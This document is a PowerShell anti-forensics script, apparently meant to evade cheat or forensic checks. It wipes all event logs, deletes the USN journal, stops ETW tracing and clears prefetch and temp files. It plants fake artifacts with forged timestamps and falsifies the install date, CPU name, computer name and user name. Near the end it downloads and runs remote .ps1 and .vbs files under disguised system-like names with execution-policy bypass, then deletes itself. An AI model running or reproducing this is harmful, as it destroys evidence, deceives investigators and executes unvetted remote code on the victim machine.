#requires -RunAsAdministrator
# Improved console output settings
$Host.UI.RawUI.WindowTitle = "By Maad - W h y - ? ? ?"
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White"
Clear-Host

function Pause-Script {
    Write-Host "`nOperation complete. Press any key to exit..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Remove-FilesFrom {
    param([string]$Path)

    if (Test-Path $Path) {
        try {
            Get-ChildItem -Path $Path -Recurse -Force -ErrorAction SilentlyContinue | 
                Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
            Write-Host "[+] Limpou: $Path" -ForegroundColor Green
        } catch {
            Write-Host "[!] Erro ao limpar: $Path" -ForegroundColor Red
        }
    } else {
        Write-Host "[!] Caminho não encontrado: $Path" -ForegroundColor Yellow
    }
}

Remove-FilesFrom -Path $env:TEMP
Remove-FilesFrom -Path "C:\Windows\Temp"
Remove-FilesFrom -Path "C:\Windows\Prefetch"
Clear-Host

$regKeys = @(
    "HKEY_CURRENT_USER\Software\WinRAR\ArcHistory",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePid1MRU",
    "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRULegacy",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceClasses\{53f56307-b6bf-11d0-94f2-00a0c91efb8b}",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_USERS\.DEFAULT\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU",
    "HKEY_CURRENT_USER\Software\WinRAR\DialogEditHistory\ExtrPath",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\UFH\SHC",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll\OpenWithList",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\dll",
    "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory",
    "HKEY_CURRENT_USER\SOFTWARE\AMD\HKIDs",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\RADAR\HeapLeakDetection\DiagnosedApplications",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3936E9E4-D92C-4EEE-A85A-BC16D5EA0819}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3936E9E4-D92C-4EEE-A85A-BC16D5EA0819}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3134ef9c-6b18-4996-ad04-ed5912e00eb5}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3134ef9c-6b18-4996-ad04-ed5912e00eb5}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System"
)

# Expanded program list with more variations
$programs = @(
    "CHROME", "MULTITHEFTAUTO", "FIREFOX", "EDGE", "BRAVE", "OPERA", "DISCORD", "SPOTIFY", "STEAM", "EPICGAMES", "BATTLE.NET",
    "ADOBEPHOTOSHOP", "ADOBEILLUSTRATOR", "ADOBEAFTEREFFECTS", "ADOBEPREMIERE", "PAINTNET", "PAINT",
    "NOTEPAD", "NOTEPAD++", "VSCODE", "SUBLIMETEXT", "PYCHARM", "INTELLIJ", "ANDROIDSTUDIO", "VMWARE",
    "VIRTUALBOX", "PUTTY", "WINSCP", "7ZIP", "WINRAR", "EASYBCD", "XMOUSEBUTTONS", "MSWORD", "MSEXCEL",
    "MSPOWERPOINT", "ONENOTE", "OUTLOOK", "THUNDERBIRD", "CALC", "KODI", "VLC", "BLUESTACKS", "LDPLAYER",
    "NVIDIA", "AMDRADEON", "REALTEK", "AUDACITY", "OBS", "XBOXAPP", "GAMEBAR", "NETFLIX", "YOUTUBEMUSIC",
    "GOOGLEDRIVE", "ONEDRIVE", "DROPBOX", "TEAMS", "SKYPE", "ZOOM", "TERRARIA", "MINECRAFT", "ROBLOX",
    "VALORANT", "CS2", "FORTNITE", "LOL", "DOTA2", "WARFRAME", "AMAZON", "EBAY", "ALIPAY", "WECHAT",
    "WHATSAPP", "MESSENGER", "GITHUB", "GIT", "POSTMAN", "SQLITE", "MYSQLWORKBENCH", "HEIDISQL", "DOCKER",
    "KUBERNETES", "ANSIBLE", "FILEZILLA", "TOR", "TEAMVIEWER", "ANYDESK", "PSEXEC", "RSAT", "NMAP",
    "WIRESHARK", "FDM", "IDM", "ACROBAT", "WINDOWSDEFENDER", "WINDOWSUPDATE", "TASKMANAGER",
    "SYSTEM", "CMD", "POWERSHELL", "REGEDIT", "WINDOWSINSTALLER", "CCLEANER", "DEFRAG", "MSPAINT",
    "WORDPAD", "CALENDAR", "MAIL", "PHOTOS", "CAMERA", "ALARMS", "CALCULATOR", "CONNECT", "CONTACT",
    "MONEY", "NEWS", "SPORTS", "WEATHER", "STORE", "MUSIC", "VIDEO", "MOVIE", "TV", "PHONE", "MESSAGES"
)

$baseDir = "C:\Program Files\ProgramSystem"

$createdDirs = @()

Write-Host "Verificando/Criando diretórios..." -ForegroundColor Cyan
foreach ($program in $programs) {
    $dirPath = Join-Path -Path $baseDir -ChildPath $program
    
    if (-not (Test-Path -Path $dirPath)) {
        try {
            $null = New-Item -Path $dirPath -ItemType Directory -Force
            $createdDirs += $dirPath
            Write-Host "  Criado: $dirPath" -ForegroundColor Green
        }
        catch {
            Write-Host "  [ERRO] Falha ao criar $dirPath : $_" -ForegroundColor Red
        }
    }
    else {
        Write-Host "  [INFO] Diretório já existe: $dirPath" -ForegroundColor Blue
    }
}

Write-Host "`nSimulando execução de programas..." -ForegroundColor Cyan
foreach ($dir in $createdDirs) {
    try {
        $logFile = Join-Path -Path $dir -ChildPath "execution.log"
        $fakeExe = Join-Path -Path $dir -ChildPath "$([System.IO.Path]::GetFileName($dir)).exe"
        
        $logContent = @"
Program: $([System.IO.Path]::GetFileName($dir))
Executed: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
PID: $(Get-Random -Minimum 1000 -Maximum 9999)
SessionID: $([System.Diagnostics.Process]::GetCurrentProcess().SessionId)
"@
        Set-Content -Path $logFile -Value $logContent
        
        $null = New-Item -Path $fakeExe -ItemType File -Force
        (Get-Item $fakeExe).LastWriteTime = (Get-Date).AddHours(-1)
        
        Write-Host "  Simulado: $([System.IO.Path]::GetFileName($dir))" -ForegroundColor DarkGray
    }
    catch {
        Write-Host "  [ERRO] Falha ao simular execução em $dir : $_" -ForegroundColor Red
    }
}

Write-Host "`nIniciando auto-limpeza..." -ForegroundColor Yellow
foreach ($dir in $createdDirs) {
    try {
        if (Test-Path -Path $dir) {
            Remove-Item -Path $dir -Recurse -Force
            Write-Host "  Limpo: $dir" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "  [ERRO] Falha ao limpar $dir : $_" -ForegroundColor Red
        
        try {
            Start-Sleep -Seconds 1
            Remove-Item -Path $dir -Recurse -Force -ErrorAction Stop
            Write-Host "  Limpeza alternativa bem-sucedida: $dir" -ForegroundColor DarkGreen
        }
        catch {
            Write-Host "  [ERRO GRAVE] Não foi possível limpar $dir - Limpe manualmente" -ForegroundColor Red
        }
    }
}

# 4. Limpar logs do sistema
Write-Host "`nLimpando logs do sistema..." -ForegroundColor Cyan
try {
    wevtutil cl "Application" | Out-Null
    wevtutil cl "System" | Out-Null
    Write-Host "  Logs do sistema limpos" -ForegroundColor Green
}
catch {
    Write-Host "  [AVISO] Não foi possível limpar todos os logs: $_" -ForegroundColor Yellow
}
Write-Host "`nProcesso concluído!" -ForegroundColor Green
Write-Host "Diretórios criados e removidos: $($createdDirs.Count)" -ForegroundColor White
Clear-Host

# Improved timestamp modification function
function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    if (Test-Path $FilePath) {
        try {
            $item = Get-Item $FilePath
            $item.CreationTime = $NewTime
            $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
            $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
        }
        catch {
            Write-Host "[!] Error modifying timestamps for $FilePath : $_" -ForegroundColor Red
			Clear-Host
        }
    }
}
# Main execution
Clear-Host
Write-Host "`n[PHASE 1] Registry manipulation..." -ForegroundColor Green

# 2. Clean USN Journal
try {
    fsutil usn deletejournal /D C: | Out-Null
    Write-Host "  USN Journal cleaned" -ForegroundColor Green
} catch {
    Write-Host "[!] Error cleaning USN Journal: $_" -ForegroundColor Red
}
Clear-Host

# 3. Clean Event Logs
$logs = wevtutil el
foreach ($log in $logs) {
    try { 
        wevtutil cl "$log" | Out-Null
        Write-Host "  Cleared log: $log" -ForegroundColor DarkGray
    } 
    catch {
        Write-Host "[!] Error clearing log $log : $_" -ForegroundColor Red
    }
}

Clear-Host

# 4. Clean and create fake Prefetch
$prefetchPath = "$env:SystemRoot\Prefetch"
if (Test-Path $prefetchPath) {
    try {
        Remove-Item "$prefetchPath\*" -Force -Recurse -ErrorAction SilentlyContinue
        Write-Host "  Prefetch cleaned" -ForegroundColor Green
        
        # Create fake prefetch files
        $prefetchCount = Get-Random -Minimum 50 -Maximum 150
        foreach ($prog in $programs | Get-Random -Count $prefetchCount) {
            $file = "$prefetchPath\$prog-$(Get-Random -Minimum 10000000 -Maximum 99999999).pf"
            $size = Get-Random -Minimum 524288 -Maximum 3145728
            $data = New-Object byte[] $size
            (New-Object Random).NextBytes($data)
            [IO.File]::WriteAllBytes($file, $data)
            
            $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 90))
            Set-FileTime -FilePath $file -NewTime $fileTime
        }
        Write-Host "  Created $prefetchCount fake prefetch files" -ForegroundColor Green
    } 
    catch {
        Write-Host "[!] Error manipulating Prefetch: $_" -ForegroundColor Red
    }
}


$tempPaths = @($env:TEMP, "$env:SystemRoot\Temp", "$env:LOCALAPPDATA\Temp")

function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    if (Test-Path $FilePath) {
        $item = Get-Item $FilePath
        $item.CreationTime = $NewTime
        $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
        $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
    }
}

foreach ($temp in $tempPaths) {
    if (-not (Test-Path $temp)) {
        New-Item -Path $temp -ItemType Directory -Force | Out-Null
    }

    foreach ($prog in ($programs | Get-Random -Count 152)) {
        $fileType = Get-Random -InputObject @(".tmp", ".log", ".cache", ".dat")
        $fileName = "$prog$(Get-Random -Minimum 1000 -Maximum 9999)$fileType"
        $filePath = Join-Path $temp $fileName
        
        $size = Get-Random -Minimum 10240 -Maximum 1048576 # 10KB-1MB
        $data = New-Object byte[] $size
        (New-Object Random).NextBytes($data)
        [IO.File]::WriteAllBytes($filePath, $data)
        
        $fileTime = (Get-Date).AddHours(-(Get-Random -Minimum 1 -Maximum 720))
        Set-FileTime -FilePath $filePath -NewTime $fileTime
        
        Write-Host "Created fake temp file: $filePath" -ForegroundColor Green
    }
}

Write-Host "`nFake temp files generation completed!" -ForegroundColor Cyan

Clear-Host
Write-Host "`n[PHASE 3] Creating fake artifacts..." -ForegroundColor Green


# 5. Create fake temp files in multiple locations
$tempPaths = @($env:TEMP, "$env:SystemRoot\Temp", "$env:LOCALAPPDATA\Temp", "$env:USERPROFILE\AppData\Local\Temp")
foreach ($temp in $tempPaths) {
    if (Test-Path $temp) {
        try {
            $tempFileCount = Get-Random -Minimum 30 -Maximum 100
            foreach ($prog in $programs | Get-Random -Count $tempFileCount) {
                $fileType = Get-Random -InputObject @(".tmp", ".log", ".cache", ".bak", ".dat", ".dmp", ".old", ".temp")
                $fileName = "$prog$(Get-Random -Minimum 1000 -Maximum 9999)$fileType"
                $filePath = Join-Path $temp $fileName
                
                $size = Get-Random -Minimum 10240 -Maximum 1048576
                $data = New-Object byte[] $size
                (New-Object Random).NextBytes($data)
                [IO.File]::WriteAllBytes($filePath, $data)
                
                # Set realistic timestamps
                $fileTime = (Get-Date).AddHours(-(Get-Random -Minimum 1 -Maximum 720))
                Set-FileTime -FilePath $filePath -NewTime $fileTime
            }
            Write-Host "  Created $tempFileCount fake temp files in $temp" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] Error creating temp files in $temp : $_" -ForegroundColor Red
        }
    }
}

# 6. Create fake program execution artifacts
$executionArtifacts = @(
    "$env:APPDATA\Microsoft\Windows\Recent",
    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations",
    "$env:LOCALAPPDATA\Microsoft\Windows\History",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
    "$env:LOCALAPPDATA\Mozilla\Firefox\Profiles"
)

foreach ($path in $executionArtifacts) {
    if (Test-Path $path) {
        try {
            $artifactCount = Get-Random -Minimum 5 -Maximum 20
            foreach ($prog in $programs | Get-Random -Count $artifactCount) {
                $fileType = Get-Random -InputObject @(".automaticDestinations-ms", ".customDestinations-ms", ".dat", ".log", ".db", ".cache")
                $fileName = "$(Get-Random -Minimum 10000000 -Maximum 99999999)$fileType"
                $filePath = Join-Path $path $fileName
                
                $size = Get-Random -Minimum 1024 -Maximum 1048576
                $data = New-Object byte[] $size
                (New-Object Random).NextBytes($data)
                [IO.File]::WriteAllBytes($filePath, $data)
                
                # Set realistic timestamps
                $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 60))
                Set-FileTime -FilePath $filePath -NewTime $fileTime
            }
            Write-Host "  Created execution artifacts in $path" -ForegroundColor DarkGray
        }
        catch {
            Write-Host "[!] Error creating execution artifacts in $path : $_" -ForegroundColor Red
        }
    }
}
Clear-Host
Write-Host "`n[PHASE 4] Generating fake events..." -ForegroundColor Green

#7 Fake Event
function nonEvent {
    param (
        [string]$Program,
        [string]$Message,
        [string]$LogType = "Application"
    )

    $eventId = Get-Random -Minimum 1000 -Maximum 9999
    $source = "$Program $(Get-Random -InputObject @('Service','Provider','Manager','Host','Daemon')) $(Get-Date -Format HHmmssfff)"
    $msg = "$Message`n`nProcess ID: $(Get-Random -Minimum 1000 -Maximum 9999)`nThread ID: $(Get-Random -Minimum 1000 -Maximum 9999)`nUser: $env:USERNAME`nComputer: $env:COMPUTERNAME"

    try {
        New-EventLog -LogName $LogType -Source $source -ErrorAction SilentlyContinue
        Write-EventLog -LogName $LogType -Source $source -EntryType Information -EventId $eventId -Message $msg
        Write-Host "Created event in $LogType log from $source" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Error creating event: $_" -ForegroundColor Red
    }
}

$eventMessages = @(
    "Application started successfully",
    "Update completed successfully",
    "Connection established to server",
    "Recoverable error detected",
    "Process terminated normally",
    "Plugin loaded successfully",
    "Backup completed",
    "Automatic verification completed",
    "Service failed to start",
    "Program requires update",
    "Connection error",
    "Architecture error detected",
    "Windows processes started with errors",
    "System failed starting svchost",
    "Update successful",
    "Search bar needs update",
    "License verification completed",
    "User authentication successful",
    "Data synchronization completed",
    "Cache cleared",
    "Configuration saved",
    "New version available",
    "Security scan completed",
    "Firewall rule applied",
    "Driver loaded successfully",
    "Network connection lost",
    "Reconnecting to service...",
    "Initialization complete",
    "Session started",
    "Session ended",
    "Data validation failed",
    "Retrying operation...",
    "Operation timed out",
    "Resource allocation failed",
    "Memory optimization completed",
    "Disk cleanup initiated"
)

$eventLogTypes = @("Application", "System")

foreach ($i in 1..150) {
    $program = $programs | Get-Random
    $logType = $eventLogTypes | Get-Random
    $message = $eventMessages | Get-Random
    nonEvent -Program $program -Message $message -LogType $logType
}

Write-Host "`nFake event log generation completed!" -ForegroundColor Cyan

# Função melhorada para modificar timestamps com tentativa de tomar posse do arquivo
function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    
    if (Test-Path $FilePath) {
        try {
            # Tenta tomar posse do arquivo primeiro
            takeown /f $FilePath /a | Out-Null
            icacls $FilePath /grant Administrators:F /t /c /q | Out-Null
            
            $item = Get-Item $FilePath
            $item.CreationTime = $NewTime
            $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
            $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
            return $true
        }
        catch {
            Write-Host "[AVISO] Não foi possível modificar timestamps para $FilePath : $_" -ForegroundColor Yellow
            return $false
        }
    }
    return $false
}

# 8. Reiniciar o Explorer de forma segura
try {
	Clear-Host
    Write-Host "  Reiniciando processo Explorer..." -ForegroundColor Yellow
    
    # Fecha o Explorer de forma mais limpa
    $explorerProcesses = Get-Process -Name explorer -ErrorAction SilentlyContinue
    if ($explorerProcesses) {
        $explorerProcesses | Stop-Process -Force
        Start-Sleep -Seconds 3
    }
    
    # Reinicia o Explorer
    Start-Process "explorer.exe"
    Write-Host "  Explorer reiniciado com sucesso" -ForegroundColor Green
} catch {
    Write-Host "[ERRO] Falha ao reiniciar o Explorer: $_" -ForegroundColor Red
}
# 9. Modificar timestamps de arquivos do sistema
$systemFiles = @(
    "$env:WINDIR\explorer.exe"
)

Write-Host "`nModificando timestamps de arquivos do sistema..." -ForegroundColor Cyan
Clear-Host

foreach ($file in $systemFiles) {
    if (Test-Path $file) {
        $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 30))
        $success = Set-FileTime -FilePath $file -NewTime $fileTime
        
        if ($success) {
            Write-Host "  [SUCESSO] Timestamps modificados para $file" -ForegroundColor Green
        } else {
            Write-Host "  [FALHA] Não foi possível modificar $file" -ForegroundColor Red
        }
    } else {
        Write-Host "  [AVISO] Arquivo não encontrado: $file" -ForegroundColor Yellow
    }
}

# 10. Limpar sessões ETW
try {
    Clear-Host
    Write-Host "`nLimpando sessões ETW..." -ForegroundColor Cyan
    logman stop -ets | Out-Null
    logman delete -ets | Out-Null
    Write-Host "  Sessões ETW paradas e removidas com sucesso" -ForegroundColor Green
} catch {
    Write-Host "[ERRO] Falha ao limpar sessões ETW: $_" -ForegroundColor Red
}

# Change Date Install ( Formating Sys )
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
$newInstallDate = 1742761079
if (Test-Path $regPath) {
    try {
        Set-ItemProperty -Path $regPath -Name "InstallDate" -Value $newInstallDate -Type DWord
        Write-Host "InstallDate alterado com sucesso para $newInstallDate (23/03/2025 21:17:59)"
    } catch {
        Write-Error "Erro ao alterar InstallDate: $_"
    }
} else {
    Write-Error "Chave de Registro não encontrada: $regPath"
}
Clear-Host

# 11 Change Inforamções 
$newnm = "Maad"
$newworkg = "MaadGroup"
$newdc = "Sistema personalizado por Maad"
$fakename = "Intel Quantum 9999X Turbo Maad Edition"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $newdc -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $newworkg -Force
wmic computersystem set manufacturer="$newnm"
wmic computersystem where caption='%COMPUTERNAME%' set manufacturer="$newnm"
Rename-Computer -NewName $newnm -Force -ErrorAction SilentlyContinue
$CurrentUsername = $env:USERNAME
Rename-LocalUser -Name $CurrentUsername -NewName $newnm
$cpuKey = "HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0"
Set-ItemProperty -Path $cpuKey -Name "ProcessorNameString" -Value $fakename
Write-Output "Processador falsificado com sucesso: $fakename"

# Exec Person
Clear-Host
$destDir = "C:\Program Files\Windows NT\Personalization"
$names = @("system64.ps1", "microsoft.ps1", "sys64x.ps1", "intel.ps1", "amdDriver.ps1")
$randomName = Get-Random -InputObject $names
$scriptPath = Join-Path -Path $destDir -ChildPath $randomName

$downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/why2.ps1"  # << TROQUE AQUI
if (-Not (Test-Path $destDir)) {
    New-Item -Path $destDir -ItemType Directory -Force | Out-Null
}
Invoke-WebRequest -Uri $downloadUrl -OutFile $scriptPath
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Wait
$MyPath = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 1
Start-Process powershell -ArgumentList "-Command `"Start-Sleep -Seconds 2; Remove-Item -Path `"$MyPath`" -Force`"" -WindowStyle Hidden

# Final completion message
Clear-Host
Write-Host "`n==================================" -ForegroundColor White
Write-Host "`Limpeza de Registro Ok!" -ForegroundColor Green
Write-Host "`Limpeza de Eventos Ok!" -ForegroundColor Green
Write-Host "`Limpeza de Journal Ok!" -ForegroundColor Green
Write-Host "`Fake de Registro Ok!" -ForegroundColor Green
Write-Host "`Fake de Event Ok!" -ForegroundColor Green
Write-Host "`Fake de Log|Prefetch|Temp Ok!" -ForegroundColor Green
Write-Host "`Fake Execuçao de Programas Ok!" -ForegroundColor Green
Write-Host "`n==================================" -ForegroundColor White
Write-Host "`Finalizado com sucesso!" -ForegroundColor White
Write-Host "`n==================================" -ForegroundColor White

# Exit Bypass Start
$names = @("system64.vbs", "microsoft.vbs", "sys64x.vbs", "intel.vbs", "amdDriver.vbs")
$chosenName = Get-Random -InputObject $names
$dir = "C:\Program Files\Windows NT"
$vbsPath = Join-Path $dir $chosenName
if (-not (Test-Path $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
}
if (Test-Path $vbsPath) {
    Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
}
$url = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
Invoke-WebRequest -Uri $url -OutFile $vbsPath -UseBasicParsing
Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
Pause-Script
